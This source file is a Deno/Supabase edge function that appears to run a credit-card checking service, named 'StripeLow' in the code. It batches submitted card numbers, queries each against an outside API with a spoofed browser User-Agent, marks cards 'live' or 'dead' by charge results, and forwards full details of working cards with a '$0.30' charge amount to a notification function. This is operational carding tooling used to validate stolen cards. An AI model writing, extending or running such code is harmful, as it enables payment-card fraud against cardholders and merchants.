import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type, x-supabase-client-platform, x-supabase-client-platform-version, x-supabase-client-runtime, x-supabase-client-runtime-version",
  "Access-Control-Allow-Methods": "POST, OPTIONS",
};

const SUPABASE_URL = Deno.env.get("SUPABASE_URL")!;
const SUPABASE_ANON_KEY = Deno.env.get("SUPABASE_ANON_KEY")!;

const API_BASE_URL = "https://3-production-c130.up.railway.app/api";

interface CardResult {
  cc: string;
  status: string;
  message: string;
  apiStatus: string;
}

// Notify charged card (fire-and-forget)
const notifyChargedCard = (
  userId: string,
  cardDetails: string,
  status: "CHARGED" | "DECLINED" | "UNKNOWN",
  responseMessage: string,
  amount: string,
  gateway: string
) => {
  const SUPABASE_SERVICE_ROLE_KEY = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY");
  if (!SUPABASE_SERVICE_ROLE_KEY) return;

  fetch(`${SUPABASE_URL}/functions/v1/notify-charged-card`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "Authorization": `Bearer ${SUPABASE_SERVICE_ROLE_KEY}`,
    },
    body: JSON.stringify({
      userId,
      cardDetails,
      status,
      responseMessage,
      amount,
      gateway,
    }),
  }).catch((err) => console.error("[STRIPELOW-BATCH] notify error:", err));
};

// Check single card against API
const checkCard = async (cc: string): Promise<CardResult> => {
  const apiUrl = `${API_BASE_URL}?cc=${encodeURIComponent(cc)}`;
  
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), 55000);
  
  try {
    const response = await fetch(apiUrl, {
      method: 'GET',
      headers: { 
        'Accept': 'application/json, text/plain, */*',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
      },
      signal: controller.signal,
    });
    
    clearTimeout(timeoutId);
    const rawText = await response.text();
    
    if (!rawText || rawText.trim() === '') {
      return { cc, status: 'unknown', message: 'Empty response', apiStatus: 'UNKNOWN' };
    }
    
    let apiStatus = 'unknown';
    let apiMessage = 'Transaction processed';
    
    try {
      const json = JSON.parse(rawText);
      
      // Extract message - handle nested error structure
      if (json.error?.error?.message) {
        apiMessage = json.error.error.message;
      } else if (json.error?.message) {
        apiMessage = json.error.message;
      } else if (json.message && typeof json.message === 'string') {
        apiMessage = json.message;
      } else if (json.msg && typeof json.msg === 'string') {
        apiMessage = json.msg;
      } else if (json.error && typeof json.error === 'string') {
        apiMessage = json.error;
      }
      
      // Determine status
      const successField = json.success;
      const statusField = String(json.status || '').toLowerCase();
      const errorCode = json.error?.error?.code || json.error?.code || '';
      
      if (successField === false) {
        apiStatus = 'dead';
      } else if (successField === true) {
        apiStatus = 'live';
      } else if (errorCode === 'card_declined' || errorCode.includes('declined')) {
        apiStatus = 'dead';
      } else if (statusField === 'declined' || statusField === 'failed' || statusField === 'error') {
        apiStatus = 'dead';
      } else if (statusField === 'success' || statusField === 'charged' || statusField === 'approved') {
        apiStatus = 'live';
      } else {
        const lowerMessage = apiMessage.toLowerCase();
        if (lowerMessage.includes('declined') || lowerMessage.includes('failed') || 
            lowerMessage.includes('invalid') || lowerMessage.includes('expired')) {
          apiStatus = 'dead';
        } else if (lowerMessage.includes('success') || lowerMessage.includes('charged')) {
          apiStatus = 'live';
        }
      }
    } catch {
      const lowerText = rawText.toLowerCase();
      apiMessage = rawText.substring(0, 200);
      if (lowerText.includes('declined') || lowerText.includes('failed')) {
        apiStatus = 'dead';
      } else if (lowerText.includes('success') || lowerText.includes('charged')) {
        apiStatus = 'live';
      }
    }
    
    return {
      cc,
      status: apiStatus,
      message: apiMessage,
      apiStatus: apiStatus === 'live' ? 'CHARGED' : apiStatus === 'dead' ? 'DECLINED' : 'UNKNOWN',
    };
    
  } catch (error) {
    clearTimeout(timeoutId);
    return { cc, status: 'unknown', message: 'Timeout or error', apiStatus: 'UNKNOWN' };
  }
};

serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const authHeader = req.headers.get("Authorization");
    if (!authHeader?.startsWith("Bearer ")) {
      return new Response(JSON.stringify({ error: "Unauthorized" }), 
        { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    const body = await req.json();
    const { cards } = body;
    
    if (!cards || !Array.isArray(cards) || cards.length === 0) {
      return new Response(JSON.stringify({ error: 'Cards array required', results: [] }), 
        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
    }

    // Limit batch size to 10
    const batch = cards.slice(0, 10);

    // Verify auth
    const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY, {
      global: { headers: { Authorization: authHeader } },
    });

    const { data: { user }, error: authError } = await supabase.auth.getUser();
    if (authError || !user) {
      return new Response(JSON.stringify({ error: "Invalid token" }), 
        { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // Check if banned
    const { data: profile } = await supabase
      .from("profiles")
      .select("is_banned")
      .eq("user_id", user.id)
      .single();

    if (profile?.is_banned) {
      return new Response(JSON.stringify({ error: "Account suspended" }), 
        { status: 403, headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // Process all cards in parallel (10 concurrent)
    const results = await Promise.all(batch.map(cc => checkCard(cc)));
    
    // Notify for charged cards (fire-and-forget)
    results.forEach(result => {
      if (result.status === 'live') {
        notifyChargedCard(user.id, result.cc, 'CHARGED', result.message, '$0.30', 'StripeLow');
      }
    });
    
    return new Response(
      JSON.stringify({ results }),
      { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );

  } catch (error) {
    const msg = error instanceof Error ? error.message : 'Error';
    return new Response(JSON.stringify({ error: msg, results: [] }), 
      { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
  }
});
